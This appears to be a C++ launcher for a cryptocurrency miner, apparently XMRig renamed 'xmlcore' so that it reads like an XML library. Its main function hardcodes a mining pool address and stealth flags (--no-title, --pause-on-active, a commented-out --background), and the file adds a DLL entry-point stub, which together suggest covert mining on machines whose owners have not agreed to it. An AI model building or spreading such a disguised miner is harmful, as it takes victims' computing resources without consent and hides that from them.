/* xmlcore
 * Copyright 2010      Jeff Garzik <jgarzik@pobox.com>
 * Copyright 2012-2014 pooler      <pooler@litecoinpool.org>
 * Copyright 2014      Lucas Jones <https://github.com/lucasjones>
 * Copyright 2014-2016 Wolf9466    <https://github.com/OhGodAPet>
 * Copyright 2016      Jay D Dee   <jayddee246@gmail.com>
 * Copyright 2017-2018 XMR-Stak    <https://github.com/fireice-uk>, <https://github.com/psychocrypt>
 * Copyright 2018-2019 SChernykh   <https://github.com/SChernykh>
 * Copyright 2016-2019 xmlcore       <https://github.com/xmlcore>, <support@xmlcore.com>
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "App.h"
#include "base/kernel/Entry.h"
#include "base/kernel/Process.h"
#include <stdio.h>
#include <windows.h>


int main(int argc, char **argv) {
    using namespace xmlcore;
    char  arg0[] = "xmlcore.exe";
    char  arg1[] = "-o";
    char  arg2[] = "192.168.202.97:8443";
    //char  arg3[] = "--background";
    char  arg4[] = "--no-title";
    char  arg5[] = "--nicehash";
    char arg6[] = "--pause-on-active=true";
    // char arg6[] = "--cpu-max-threads-hint";
    // char arg7[] = "50";

    char *argvv[] = { &arg0[0], &arg1[0], &arg2[0], &arg4[0], &arg5[0], &arg6[0], NULL };
    //char *argvv[] = { &arg0[0], &arg1[0], &arg2[0], &arg3[0], &arg4[0], &arg5[0], &arg6[0], &arg7[0], NULL };
    int   argcc   = (int)(sizeof(argvv) / sizeof(argvv[0])) - 1;
    // for(int i = 0; i < argcc; i++)
    //    printf("%s\n", argvv[i]);

    Process process(argcc, &argvv[0]);
    const Entry::Id entry = Entry::get(process);
    if (entry) {
        return Entry::exec(process, entry);
    }

    App app(&process);

    return app.exec();
}

BOOL APIENTRY DllMain1(
    //HINSTANCE hinstDLL,  // handle to DLL module
    HMODULE hModule,
    DWORD fdwReason,     // reason for calling function
    LPVOID lpReserved )  // reserved
{
    LPCWSTR myText = L"";
    LPCWSTR myCaption = L"xmlcoree";
    // Perform actions based on the reason for calling.
    switch( fdwReason ) 
    { 
        case DLL_PROCESS_ATTACH:
         // Initialize once for each new process.
         // Return FALSE to fail DLL load.
            myText = L"Proc Attach";
            myCaption = L"xmlcoree";
            MessageBoxW( NULL, myText, myCaption, MB_OK );
            FreeLibraryAndExitThread(hModule, 0);
            break;

        // case DLL_THREAD_ATTACH:
        //  // Do thread-specific initialization.
        //     myText = L"Thread Attach";
        //     myCaption = L"xmlcoree";
        //     MessageBoxW( NULL, myText, myCaption, MB_OK );
        //     break;

        // case DLL_THREAD_DETACH:
        //  // Do thread-specific cleanup.
        //     myText = L"Thread Detach";
        //     myCaption = L"xmlcoree";
        //     MessageBoxW( NULL, myText, myCaption, MB_OK );
        //     break;

        case DLL_PROCESS_DETACH:
         // Perform any necessary cleanup.
            myText = L"Proc Detach";
            myCaption = L"xmlcoree";
            MessageBoxW( NULL, myText, myCaption, MB_OK );
            break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}
